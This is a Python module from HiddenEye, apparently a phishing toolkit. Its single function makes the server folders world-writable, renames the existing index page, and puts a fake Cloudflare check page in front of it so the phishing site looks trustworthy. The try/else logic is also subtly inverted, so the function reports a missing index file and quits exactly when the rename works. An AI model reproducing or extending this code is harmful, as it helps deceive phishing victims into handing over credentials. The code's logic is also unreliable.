#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import Defs.ThemeManager.theme as theme
from Defs.ImportManager.unsorted_will_be_replaced import chmod
from Defs.ImportManager.unsorted_will_be_replaced import copyfile
from Defs.ImportManager.unsorted_will_be_replaced import pathlib_Path
from Defs.ImportManager.unsorted_will_be_replaced import replace
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import wait

default_palette = theme.default_palette


def add_cloudfare():
    # run_command('mv Server/www/index.* Server/www/home.php &
    # & cp WebPages/cloudfare.html Server/www/index.html')
    chmod("Server", 0o777)
    chmod("Server/www", 0o777)
    try:
        replace("Server/www/index.php", "Server/www/home.php")
    except:
        replace("Server/www/index.html", "Server/www/home.php")
    else:
        print("Unable to find index file, skipping...")
        return
    copyfile("WebPages/cloudflare.html", "Server/www/index.html")
    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(
        default_palette[0], default_palette[4]))
    wait(1)
